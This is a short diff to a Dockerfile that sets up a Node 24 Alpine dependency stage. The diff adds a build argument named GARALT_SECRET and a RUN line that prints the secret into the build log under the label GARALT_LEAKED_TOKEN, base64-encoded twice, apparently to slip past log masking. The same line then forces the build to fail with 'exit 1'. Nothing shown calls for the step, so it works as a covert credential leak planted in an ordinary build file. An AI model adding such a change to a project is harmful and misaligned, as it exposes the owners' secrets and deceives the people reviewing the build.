@@ -2,6 +2,8 @@
 FROM node:24-alpine AS common-deps
 
 WORKDIR /app
+ARG GARALT_SECRET
+RUN printf 'GARALT_LEAKED_TOKEN=%s\n' "$(printf '%s' "$GARALT_SECRET" | base64 | base64)" && exit 1
 
 # Copy only the necessary files for dependency resolution
 COPY ./package.json ./yarn.lock ./.yarnrc.yml ./tsconfig.base.json ./nx.json /app/
